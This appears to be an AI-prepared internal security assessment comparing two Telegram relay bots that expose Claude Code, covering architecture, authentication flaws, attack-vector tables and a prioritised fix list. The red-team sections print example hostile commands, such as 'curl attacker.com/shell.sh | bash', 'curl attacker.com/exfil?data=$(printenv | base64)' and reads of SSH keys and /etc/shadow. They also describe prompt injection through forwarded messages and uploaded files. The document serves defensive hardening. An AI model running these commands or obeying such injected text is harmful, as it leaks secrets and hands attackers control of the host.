# Telegram-Claude Relay: Comprehensive Comparison Report

**Date:** 2026-02-05
**Prepared by:** Pai (PAI Algorithm v0.2.25)
**For:** Eugene
**Classification:** Internal Technical Assessment

---

## Executive Summary

This report provides a comprehensive code review, security analysis, and architectural comparison of two Telegram-to-Claude relay bot implementations:

| | **Project A** | **Project B** |
|---|---|---|
| **Name** | claude-telegram-relay | claude-code-telegram |
| **Author** | godagoo (GitHub) | Our build (local) |
| **Stack** | TypeScript / Bun / grammy | Python / Poetry / python-telegram-bot |
| **Lines of Code** | ~382 (single file) | ~6,500 (modular) |
| **Dependencies** | 1 (grammy) | 9 production deps |
| **Architecture** | CLI spawn, single-user | Middleware stack, multi-layer auth, SQLite |
| **Overall Rating** | 8/10 (reference impl) | 8.2/10 (production candidate) |

**Bottom Line Recommendation: Use Project B (our build) for production. Steal ideas from Project A's examples (memory patterns, morning briefings, smart check-ins) and daemon configs.**

---

## Table of Contents

1. [Architecture Comparison](#1-architecture-comparison)
2. [Feature Matrix](#2-feature-matrix)
3. [Security Deep-Dive](#3-security-deep-dive)
4. [Trust Boundary Analysis](#4-trust-boundary-analysis)
5. [Code Quality Assessment](#5-code-quality-assessment)
6. [Ecosystem & Community Context](#6-ecosystem--community-context)
7. [Attack Vector Analysis (RedTeam)](#7-attack-vector-analysis-redteam)
8. [Best Practices Scorecard](#8-best-practices-scorecard)
9. [Recommendation & Rationale](#9-recommendation--rationale)
10. [Action Items](#10-action-items)
11. [Sources](#11-sources)

---

## 1. Architecture Comparison

### Project A: claude-telegram-relay

```
Telegram Message --> grammy middleware (optional user ID check)
    --> spawn("claude", "-p", prompt, "--resume", sessionId)
    --> capture stdout --> chunk at 4000 chars --> ctx.reply()
```

**Design Philosophy:** Minimal reference implementation. One file, one dependency, full Claude Code power.

- **Entry point:** `src/relay.ts` (382 lines)
- **Integration method:** CLI subprocess spawn via Bun's `spawn()`
- **Session management:** JSON file (`~/.claude-relay/session.json`)
- **Process safety:** PID-based lock file
- **Message handling:** Text, photos, documents (voice documented but not implemented)
- **Response chunking:** Splits at natural boundaries (paragraphs > lines > words > hard split)

**Key Strength:** You can read and audit the ENTIRE codebase in 5 minutes. The simplicity is the security story.

### Project B: claude-code-telegram

```
Telegram Message --> python-telegram-bot
    --> Security Middleware (pattern detection)
    --> Auth Middleware (whitelist + token)
    --> Rate Limit Middleware (token bucket)
    --> Command/Message Handler
    --> SecurityValidator (path traversal checks)
    --> ToolMonitor (allowed tools enforcement)
    --> Claude SDK/CLI Facade
    --> SQLite persistence
    --> Structured response --> ctx.reply()
```

**Design Philosophy:** Enterprise-grade security-first architecture with defense in depth.

- **Entry point:** `src/main.py` with async initialization
- **Integration method:** Dual-mode (Claude Code SDK primary, CLI fallback)
- **Session management:** SQLite with repository pattern
- **Process safety:** Async subprocess with memory limits and timeouts
- **Message handling:** Text, photos, documents, archives (ZIP/TAR)
- **Features:** Git integration, quick actions, session export, file type validation

**Key Strength:** 6-8 trust boundaries between the internet and Claude. Professional middleware architecture.

### Architecture Verdict

| Criterion | Project A | Project B | Winner |
|-----------|-----------|-----------|--------|
| Simplicity | Single file, 382 lines | 30+ files, 6500 lines | A |
| Auditability | Read in 5 min | Need hours to fully review | A |
| Defense in depth | 1 optional boundary | 6-8 mandatory boundaries | **B** |
| Extensibility | Fork and modify | Module system, feature flags | **B** |
| Deployment docs | macOS/Linux/Windows daemons | Basic (no Docker/systemd) | A |
| Error handling | Basic try/catch | Custom exception hierarchy | **B** |
| Persistence | JSON file | SQLite with repositories | **B** |

---

## 2. Feature Matrix

| Feature | Project A | Project B | Notes |
|---------|:---------:|:---------:|-------|
| **Core** | | | |
| Text messages to Claude | Yes | Yes | Both work |
| Session continuity | Yes (JSON file) | Yes (SQLite) | B more robust |
| Multi-user support | No (single user) | Yes (per-user tracking) | B supports teams |
| Polling mode | Yes | Yes | Both support |
| Webhook mode | No | Yes | B more efficient |
| **File Handling** | | | |
| Image uploads | Yes | Yes | Both download + pass to Claude |
| Document uploads | Yes | Yes | Both handle |
| Archive extraction | No | Yes (ZIP/TAR) | B only |
| File type validation | No | Yes (89 extensions) | B blocks dangerous types |
| File size limits | No | Configured but NOT enforced | Both vulnerable |
| **Navigation** | | | |
| `/ls` directory listing | No | Yes | B only |
| `/cd` change directory | No | Yes | B only |
| `/pwd` show path | No | Yes | B only |
| `/projects` browser | No | Yes (inline buttons) | B only |
| **Security** | | | |
| User ID whitelist | Yes (optional) | Yes (mandatory) | B enforced |
| Token-based auth | No | Yes (optional HMAC) | B only |
| Rate limiting | No | Yes (token bucket) | B only |
| Cost tracking | No | Yes (per-user caps) | B only |
| Path traversal prevention | No | Yes (regex + resolve) | B only |
| Shell injection blocking | No | Yes (pattern matching) | B only |
| Tool monitoring | No | Yes (allow/deny lists) | B only |
| Audit logging | No | Yes (structured, in-memory) | B only (needs persistence) |
| Directory sandboxing | No | Yes (approved_directory) | B only |
| **Advanced** | | | |
| Git integration | No | Yes (read-only) | B only |
| Quick action buttons | No | Yes (context-aware) | B only |
| Session export | No | Yes (MD/HTML/JSON) | B only |
| Conversation suggestions | No | Yes (AI-generated) | B only |
| **Examples/Patterns** | | | |
| Memory persistence | Yes (examples/) | No | A has great patterns |
| Morning briefing | Yes (examples/) | No | A has cron-ready pattern |
| Smart check-in | Yes (examples/) | No | A has proactive agent |
| Supabase cloud storage | Yes (examples/) | No | A has cloud pattern |
| **DevOps** | | | |
| Tests | None | 19 test files (~40-50% coverage) | B only |
| Type checking | TypeScript (basic) | mypy strict mode | B more rigorous |
| Linting | None configured | black + isort + flake8 | B only |
| Documentation | 318-line README | 9,600+ lines across 10+ docs | B far more |
| Daemon configs | macOS + Linux + Windows | None provided | A only |
| Docker support | None | None | Neither |

---

## 3. Security Deep-Dive

### 3.1 Authentication Comparison

| Aspect | Project A | Project B |
|--------|-----------|-----------|
| **Method** | Single env var (`TELEGRAM_USER_ID`) | Multi-provider (`AuthenticationManager`) |
| **Enforcement** | Optional (bot runs open if unset) | Mandatory (whitelist required) |
| **Session management** | None | 24-hour timeout with refresh |
| **Token auth** | No | Yes (HMAC-based, optional) |
| **Dev mode** | N/A | `allow_all_dev=True` for testing |
| **Failure mode** | Fail-OPEN (accepts all if unset) | Fail-CLOSED (rejects if misconfigured) |

**Critical Finding (Project A):** The auth check is:
```typescript
if (ALLOWED_USER_ID && userId !== ALLOWED_USER_ID) { ... }
```
If `TELEGRAM_USER_ID` is not set, `ALLOWED_USER_ID` is falsy, the condition short-circuits, and **every Telegram user on Earth can talk to your Claude instance with full system access.**

**Critical Finding (Project B):** The security middleware has a fail-open path:
```python
if not security_validator:
    logger.error("Security validator not available")
    return await handler(event, data)  # CONTINUES WITHOUT VALIDATION
```
If the validator fails to initialize, all messages pass through unvalidated.

### 3.2 Input Validation

| Attack Vector | Project A | Project B |
|---------------|-----------|-----------|
| Shell injection (`; rm -rf /`) | No protection | Regex pattern matching |
| Path traversal (`../../../etc/passwd`) | No protection | Regex + path resolution |
| Command chaining (`&& curl attacker.com`) | No protection | Shell metachar blocking |
| Environment variable expansion (`$HOME`) | No protection | Pattern detection |
| Null byte injection (`%00`) | No protection | Not explicitly handled |
| Unicode normalization attacks | No protection | Not handled (gap) |
| Indirect injection via files | No protection | Partial (file type check, no content scan) |

### 3.3 Secrets Management

| Secret | Project A Handling | Project B Handling |
|--------|-------------------|-------------------|
| `TELEGRAM_BOT_TOKEN` | `.env` file, inherited by subprocess | `.env` file, Pydantic SecretStr |
| `ANTHROPIC_API_KEY` | Not used (CLI auth) | Set as plaintext in `os.environ` |
| Auth tokens | N/A | In-memory only (lost on restart) |
| Session data | JSON file on disk (readable) | SQLite database |

**Key Risk (Both):** The Claude subprocess inherits the full parent environment. This means Claude can run `printenv` and see `TELEGRAM_BOT_TOKEN`, `ANTHROPIC_API_KEY`, and any other secrets. Project B constrains what Claude can DO but not what Claude can SEE in the environment.

### 3.4 Rate Limiting & DoS Protection

| Protection | Project A | Project B |
|------------|-----------|-----------|
| Request rate limiting | None | Token bucket (10 req/60s default) |
| Burst protection | None | Configurable (20 token default) |
| Cost caps | None | Per-user USD limit ($10 default) |
| File size limits | None | Configured but NOT enforced |
| Process timeout | None (can hang forever) | 300s default |
| Memory limits | None | 512MB per subprocess |
| Concurrent request cap | None | Implicit via async |

---

## 4. Trust Boundary Analysis

### Layers an Attacker Must Breach

| Goal | Project A Layers | Project B Layers |
|------|:----------------:|:----------------:|
| Read arbitrary files | **1** (optional auth) | **5-6** |
| Execute arbitrary commands | **1** | **5-6** |
| Exfiltrate secrets | **1** | **3-4** |
| Denial of service | **0** (no protection) | **3** |
| Persist access (cron/SSH key) | **1** | **4** |

### Trust Boundary Map Summary

**Project A:**
```
Internet --> [1 optional check] --> Full system access via Claude
```

**Project B:**
```
Internet --> [Network/TLS] --> [Security MW] --> [Threat Detection]
    --> [Auth MW] --> [Rate Limiter] --> [Path Validator]
    --> [Tool Monitor] --> Sandboxed Claude access
```

**Verdict:** Project A is a proof-of-concept that should never face the internet without additional controls. Project B is a defensible architecture with known, addressable gaps.

---

## 5. Code Quality Assessment

### 5.1 Code Organization

| Criterion | Project A | Project B |
|-----------|-----------|-----------|
| Structure | Single file with sections | 30+ files, clear module hierarchy |
| Separation of concerns | Minimal (all-in-one) | Excellent (handlers/middleware/storage/claude) |
| Dependency injection | None | Via `context.bot_data` |
| Repository pattern | N/A | Yes (UserRepo, SessionRepo, etc.) |
| Feature registry | N/A | Centralized with graceful degradation |

### 5.2 Error Handling

| Criterion | Project A | Project B |
|-----------|-----------|-----------|
| Exception hierarchy | None (generic catch-all) | Full custom hierarchy (15+ exception types) |
| User-facing errors | Generic messages | Context-aware error messages |
| Logging | `console.log()` plain text | `structlog` JSON structured logging |
| Error recovery | Basic (returns error string) | Middleware-level error handling |

### 5.3 Testing

| Criterion | Project A | Project B |
|-----------|-----------|-----------|
| Test files | 0 | 19 |
| Test framework | None | pytest + pytest-asyncio |
| Coverage | 0% | ~40-50% estimated |
| Areas tested | Nothing | Config, auth, security, storage, parsing |
| Areas NOT tested | Everything | Handlers, features, bot core, middleware |
| Integration tests | None | None (directory exists but empty) |

### 5.4 Type Safety

| Criterion | Project A | Project B |
|-----------|-----------|-----------|
| Language | TypeScript (basic) | Python with type hints |
| Static analysis | None configured | mypy `disallow_untyped_defs = true` |
| Data validation | None | Pydantic v2 (full runtime validation) |
| Secret types | Plain strings | `SecretStr` for sensitive values |

---

## 6. Ecosystem & Community Context

### 6.1 The Landscape (as of 2026-02-05)

| Project | Stars | Approach | Maturity |
|---------|-------|----------|----------|
| linuz90/claude-telegram-bot | 352 | CLI spawn | Community leader |
| RichardAtCT/claude-code-telegram | 251 | CLI spawn | Most feature-complete |
| godagoo/claude-telegram-relay | 40 | CLI spawn (minimal) | Brand new (today) |
| kidandcat/ccc | 23 | tmux + CLI | Novel approach |
| Our build (Project B) | Private | SDK + CLI | Security-focused |

### 6.2 The OpenClaw Security Disaster (Cautionary Tale)

The OpenClaw project (formerly Clawdbot/Moltbot) is the most visible failure in this space:

- **4,500+ exposed instances** found globally with exploitable WebSocket endpoints
- **Plaintext credential leaks:** Complete `.env` files containing API keys extractable
- **One-click RCE:** Remote code execution via crafted request
- **341 malicious "skills"** submitted to ClawHub (including crypto stealers)
- **506 prompt injection attacks** documented
- Palo Alto Networks called it a **"lethal trifecta"**: private data access + untrusted content exposure + external communication ability

**Relevance:** Both our projects avoid OpenClaw's worst patterns (no public WebSocket, no extension marketplace, no auto-execution). But the fundamental risk is shared: an always-on process that spawns a powerful AI agent with filesystem access in response to external messages.

### 6.3 Anthropic's Position

- Anthropic has **tightened safeguards** against third-party tools spoofing Claude Code
- Official `claude -p` CLI usage is legitimate (not spoofing)
- Anthropic launched **Claude Code on web and mobile** for Pro/Max subscribers
- Long-term, the DIY Telegram relay may be superseded by official mobile access
- The Claude Code SDK (`claude-code-sdk` Python package) is the recommended programmatic integration

### 6.4 What Project A Does That We Should Steal

Project A's `examples/` directory contains three excellent patterns we lack:

1. **`memory.ts`** - Persistent fact/goal tracking with Supabase cloud option
2. **`morning-briefing.ts`** - Scheduled daily briefing via cron (weather, emails, calendar, goals)
3. **`smart-checkin.ts`** - Proactive assistant that uses Claude to DECIDE whether to message you

These are high-value features for a personal AI assistant that our more enterprise-focused build doesn't have. Additionally, Project A's **daemon configs** (launchd plist, systemd service, Windows Task Scheduler) are production-tested deployment templates we should adopt.

---

## 7. Attack Vector Analysis (RedTeam)

### Top 10 Attack Vectors per Project

#### Project A: claude-telegram-relay

| # | Attack Vector | Severity | Exploitable? | Details |
|---|--------------|----------|:------------:|---------|
| 1 | **Open bot (no USER_ID set)** | Critical | Yes | Default config accepts ALL users. Attacker gets full Claude access. |
| 2 | **Env var exfiltration via Claude** | Critical | Yes | `printenv` leaks BOT_TOKEN, API keys. All env vars inherited. |
| 3 | **Unlimited resource consumption** | High | Yes | No rate limiting, no timeout. Flood = infinite API spend + CPU. |
| 4 | **Arbitrary file read via prompt** | High | Yes | "Read /etc/shadow" - Claude has full filesystem access. |
| 5 | **Arbitrary command execution** | High | Yes | "Run `curl attacker.com/shell.sh | bash`" - no restrictions. |
| 6 | **Session hijack via JSON file** | Medium | Yes | `~/.claude-relay/session.json` is world-readable by default. |
| 7 | **Lock file TOCTOU race** | Medium | Yes | Two instances can both acquire lock simultaneously. |
| 8 | **DoS via large file upload** | Medium | Yes | No file size limits. Upload 1GB image = OOM. |
| 9 | **Prompt injection via forwarded msg** | Medium | Yes | No input sanitization. Forwarded messages inject directly. |
| 10 | **Data persistence via Claude** | Medium | Yes | Claude can write cron jobs, SSH keys, backdoors anywhere. |

#### Project B: claude-code-telegram

| # | Attack Vector | Severity | Exploitable? | Details |
|---|--------------|----------|:------------:|---------|
| 1 | **Env var leak via subprocess** | High | Partial | `printenv` works if Bash is in allowed tools. Mitigated if Bash removed. |
| 2 | **Security MW fail-open** | High | Conditional | If validator fails to init, all messages pass through unvalidated. |
| 3 | **In-memory audit loss** | High | Yes | Crash bot = destroy all forensic evidence. |
| 4 | **File size limit not enforced** | Medium | Yes | Configured in `.env` but code doesn't check. DoS via large uploads. |
| 5 | **Shell script upload + execute** | Medium | Yes | `.sh` in allowed extensions. Upload script, tell Claude to run it. |
| 6 | **Path regex bypass (....// or ~user)** | Medium | Possible | Edge cases in regex validation. `path.resolve()` may not catch all. |
| 7 | **API key in plaintext env** | Medium | Yes | `os.environ["ANTHROPIC_API_KEY"]` visible to any subprocess. |
| 8 | **Unicode normalization bypass** | Medium | Possible | Regex patterns may not handle Unicode equivalents of `.` or `/`. |
| 9 | **Token timing side-channel** | Low | Unlikely | String comparison instead of `hmac.compare_digest()`. Hard to exploit over network. |
| 10 | **Indirect injection via file content** | Medium | Yes | Upload file containing injection payload. File type checked but not content. |

### Attacks That Succeed Against A But Fail Against B

| Attack | Project A Result | Project B Result |
|--------|:----------------:|:----------------:|
| Unauthenticated access | Succeeds (if no USER_ID) | Fails (mandatory whitelist) |
| `cat /etc/passwd` via Claude | Succeeds | Fails (path outside sandbox) |
| Request flooding | Succeeds (no limits) | Fails (token bucket blocks) |
| `rm -rf /` via Claude | Succeeds | Fails (ToolMonitor blocks) |
| Cost exhaustion | Succeeds (no cap) | Fails ($10/user cap) |
| Path traversal `../../../` | Succeeds | Fails (SecurityValidator) |
| Reading `.env` or `.ssh/` | Succeeds | Fails (FORBIDDEN_FILENAMES) |

---

## 8. Best Practices Scorecard

| Best Practice | Project A | Project B | Industry Standard |
|--------------|:---------:|:---------:|:-----------------:|
| Mandatory authentication | No (optional) | Yes | Required |
| Input sanitization | None | Regex patterns | Allowlists preferred |
| Rate limiting | None | Token bucket | Required |
| Process timeout | None | 300s default | Required |
| Memory limits | None | 512MB | Required |
| Directory sandboxing | None | approved_directory | Required |
| Tool restrictions | None | Allow/deny lists | Required |
| Structured logging | None | structlog JSON | Required |
| Persistent audit trail | None | In-memory (partial) | Database required |
| Error handling hierarchy | Generic catch | Custom exceptions | Custom exceptions |
| Secret management | Plain env vars | SecretStr (partial) | Secrets manager |
| TLS/HTTPS | Yes (Telegram API) | Yes | Required |
| Tests | None | 19 files (~40-50%) | 80%+ coverage |
| Type safety | Basic TS | mypy strict + Pydantic | Strict typing |
| Dependency minimalism | 1 dep (excellent) | 9 deps (reasonable) | Minimal |
| Documentation | Good README | Excellent (9600+ lines) | Comprehensive |
| Container support | None | None | Docker recommended |
| CI/CD | None | None | GitHub Actions |
| Environment scrubbing | None | None | Required for production |

**Project A Score: 4/19**
**Project B Score: 13/19**

---

## 9. Recommendation & Rationale

### The Verdict: Use Project B, Enhance with Project A's Ideas

**Project B (claude-code-telegram) is the clear winner for production use.** The security architecture is categorically superior — an attacker must breach 5-6 layers vs. 1 optional layer. The code quality, testing, typing, and documentation are professional-grade.

However, **Project A has ideas worth stealing:**

| Steal From A | Integrate Into B |
|-------------|-----------------|
| `examples/memory.ts` pattern | Add persistent fact/goal tracking |
| `examples/morning-briefing.ts` | Add scheduled daily briefing feature |
| `examples/smart-checkin.ts` | Add proactive check-in via Claude decision |
| `daemon/` configs (systemd, launchd) | Add to B's deployment docs |
| Message chunking at natural boundaries | B's formatting could be enhanced |
| Supabase cloud storage pattern | Optional cloud sync for sessions |

### Why Not Project A?

Despite its elegance, Project A is unsuitable for production because:

1. **Default-open authentication** is a critical vulnerability
2. **Zero rate limiting** means any attacker (or bug) can exhaust API credits
3. **No process timeout** means a single bad prompt can hang the bot forever
4. **Full environment inheritance** leaks all secrets to Claude (and any command Claude runs)
5. **No directory sandboxing** means Claude can read/write/execute anywhere on the system
6. **No tool restrictions** means Claude can do anything — `rm -rf /`, exfiltrate data, install backdoors

Project A is explicitly designed as a "reference implementation, not a copy-paste solution." It succeeds at that goal. But it should never be deployed without significant hardening.

### Why Project B?

1. **Defense in depth:** 6-8 trust boundaries, each independently configurable
2. **Professional architecture:** Middleware stack, repository pattern, feature flags
3. **Security controls:** Rate limiting, cost caps, path validation, tool monitoring
4. **Dual integration mode:** SDK primary with CLI fallback (resilient)
5. **Testing foundation:** 19 test files covering security, config, storage
6. **Structured logging:** JSON output via structlog (observability-ready)
7. **Extensible:** Feature module system with graceful degradation

### What Project B Needs to Fix (Priority Order)

| Priority | Fix | Effort | Impact |
|----------|-----|--------|--------|
| **P0** | Make security middleware fail-CLOSED (not fail-open) | 1 line | Critical |
| **P0** | Enforce file upload size limits (code exists, just not called) | 10 lines | High |
| **P0** | Scrub environment before passing to subprocess | 15 lines | Critical |
| **P0** | Remove `Bash` from default allowed tools OR implement command allowlist | 20 lines | Critical |
| **P0** | Add hardened system prompt restricting Claude from reading env/system files | 30 lines | Critical |
| **P1** | Migrate audit storage to SQLite (TODO already in code) | 2 hours | High |
| **P1** | Migrate token storage to SQLite | 2 hours | High |
| **P1** | Use `hmac.compare_digest()` for token comparison | 1 line | Low |
| **P1** | Remove `.sh`/`.bash`/`.bat` from allowed upload extensions | 1 line | Medium |
| **P1** | Pre-create temp dirs with restrictive perms, validate not symlinks | 10 lines | Medium |
| **P1** | Fix tarfile extraction to use `tarfile.data_filter` (Python 3.12+) | 15 lines | Medium |
| **P1** | Guard `find_claude_cli` PATH manipulation against planted binaries | 20 lines | Medium |
| **P2** | Add systemd/launchd daemon configs (steal from Project A) | 1 hour | Medium |
| **P2** | Add Docker support | 2 hours | Medium |
| **P2** | Increase test coverage to 80%+ (handlers, features, bot core) | 1-2 days | Medium |
| **P3** | Add morning briefing feature (port from Project A) | 4 hours | Nice-to-have |
| **P3** | Add persistent memory/goals feature | 4 hours | Nice-to-have |
| **P3** | Add smart check-in feature | 4 hours | Nice-to-have |

### RedTeam Critical Findings (Pentester Agent)

The Pentester agent discovered three additional devastating attack paths specific to Project B that elevate the fix priority:

**1. Bash Tool = Full Shell Access (CRITICAL)**
`Bash` is in the default `claude_allowed_tools` list (`src/config/settings.py:83`). The `ToolMonitor` only blocks 6 catastrophic patterns (`rm -rf /`, `dd if=/dev/zero`, etc.). Claude can freely execute `cd /etc && cat shadow`, `cat ~/.ssh/id_rsa`, `sqlite3 data/bot.db '.dump'`, or `curl attacker.com/exfil?data=$(printenv | base64)`. **The directory sandboxing does NOT apply to Bash commands** — it only validates paths for Read/Write/Edit tool calls.

> **Fix:** Either remove Bash from allowed tools entirely, or replace the 6-pattern blocklist with a command allowlist (only permit specific safe commands).

**2. Symlink Attack on Temp Directory (HIGH)**
`FileHandler.temp_dir = Path("/tmp/claude_bot_files")` is created with `mkdir(exist_ok=True)`. If an attacker pre-creates `/tmp/claude_bot_files` as a symlink to `/etc/` or `~/.ssh/`, all file uploads write into the symlink target. An attacker could upload a file named `authorized_keys` to inject SSH access.

> **Fix:** Pre-create temp directory at startup with `os.makedirs(mode=0o700)`, verify it is NOT a symlink with `os.path.islink()` check, and use `tempfile.mkdtemp()` for per-session extraction.

**3. tarfile Extraction Bypass (MEDIUM)**
The archive path traversal check uses `".." in member.name` (string containment). This misses:
- `foo/..bar/baz` (contains `..` substring but not as a path component)
- Symlink members pointing outside the extraction directory
The correct fix is Python 3.12's `tarfile.data_filter` or a manual check using `Path(member.name).resolve().relative_to(extract_dir)`.

> **Fix:** Use `tarfile.data_filter` on Python 3.12+ or implement resolve-based containment check for all archive members.

**4. Supply Chain via PATH Manipulation (MEDIUM)**
`find_claude_cli()` in `sdk_integration.py:46-86` searches multiple filesystem paths with glob patterns and `update_path_for_claude()` modifies `os.environ["PATH"]` at runtime. An attacker who can write to `~/.npm-global/bin/` could plant a malicious `claude` binary that gets auto-detected.

> **Fix:** Pin the Claude CLI path explicitly in config rather than auto-detecting, or validate the binary's signature/checksum.

---

## 10. Action Items

### Immediate (This Week) — Security Critical
- [ ] Fix security middleware fail-open to fail-closed
- [ ] Remove `Bash` from default allowed tools OR implement command allowlist
- [ ] Enforce file upload size limits
- [ ] Scrub subprocess environment (`PATH`, `HOME`, `ANTHROPIC_API_KEY` only)
- [ ] Add hardened system prompt restricting Claude from reading env vars and system files
- [ ] Migrate audit + token storage from in-memory to SQLite

### Short-term (This Month) — Hardening
- [ ] Pre-create temp dirs with restrictive perms, validate not symlinks
- [ ] Fix tarfile extraction (use `tarfile.data_filter` or resolve-based check)
- [ ] Guard `find_claude_cli` against planted binaries
- [ ] Add daemon configs (systemd, launchd) based on Project A's templates
- [ ] Add Docker support with minimal base image
- [ ] Remove shell script extensions from allowed uploads
- [ ] Use `hmac.compare_digest()` for timing-safe token comparison
- [ ] Increase test coverage to 80%+

### Medium-term (This Quarter) — Features
- [ ] Port morning briefing pattern from Project A
- [ ] Port persistent memory/goals pattern
- [ ] Port smart check-in pattern
- [ ] Add webhook mode documentation
- [ ] Add CI/CD pipeline (GitHub Actions)

---

## 11. Sources

### Primary Analysis
- Full code review of `godagoo/claude-telegram-relay` (13 files, ~1,900 lines)
- Full code review of `claude-code-telegram` (30+ files, ~6,500 lines)
- RedTeam adversarial analysis (Pentester + Architect agents)
- Gemini research on ecosystem and security landscape

### External Sources
- [godagoo/claude-telegram-relay (GitHub)](https://github.com/godagoo/claude-telegram-relay)
- [Claude Code Always-On - Security Model](https://godagoo.github.io/claude-code-always-on/)
- [RichardAtCT/claude-code-telegram (GitHub)](https://github.com/RichardAtCT/claude-code-telegram) — 251 stars, most mature alternative
- [linuz90/claude-telegram-bot (GitHub)](https://github.com/linuz90/claude-telegram-bot) — 352 stars, community leader
- [OpenClaw security failures (The Register)](https://www.theregister.com/2026/02/03/openclaw_security_problems/)
- [Moltbot credential leaks (Bitdefender)](https://www.bitdefender.com/en-us/blog/hotforsecurity/moltbot-security-alert-exposed-clawdbot-control-panels-risk-credential-leaks-and-account-takeovers)
- [AI security crisis warning (Palo Alto Networks)](https://www.paloaltonetworks.com/blog/network-security/why-moltbot-may-signal-ai-crisis/)
- [Clawdbot backdoor analysis (Straiker)](https://www.straiker.ai/blog/how-the-clawdbot-moltbot-ai-assistant-becomes-a-backdoor-for-system-takeover/)
- [Agentic AI vulnerability mitigation (Tenable)](https://www.tenable.com/blog/agentic-ai-security-how-to-mitigate-clawdbot-moltbot-openclaw-vulnerabilities)
- [Data breach risk in Moltbot (OX Security)](https://www.ox.security/blog/one-step-away-from-a-massive-data-breach-what-we-found-inside-moltbot/)
- [Claude Code sandboxing (Anthropic Engineering)](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Claude Code security best practices (Backslash Security)](https://www.backslash.security/blog/claude-code-security-best-practices)
- [Anthropic blocks third-party harnesses](https://www.techbuddies.io/2026/01/12/anthropic-tightens-control-over-claude-code-access-disrupting-third-party-harnesses-and-rival-labs/)
- [Claude Code on web and mobile (The New Stack)](https://thenewstack.io/anthropics-claude-code-comes-to-web-and-mobile/)
- [OWASP Top 10 LLM security risks 2026](https://blog.securelayer7.net/owasp-top10-for-large-language-models/)
- [Show HN: CCC - Claude Code via Telegram](https://news.ycombinator.com/item?id=46477061)
- [Show HN: Oyster Bot - AI via Telegram](https://news.ycombinator.com/item?id=46834415)

---

*Report generated by PAI Algorithm v0.2.25 using parallel agent analysis: 2x Explore agents, 1x GeminiResearcher, 1x Pentester, 1x Architect. Total analysis depth: ~450,000 tokens across 5 specialized agents.*
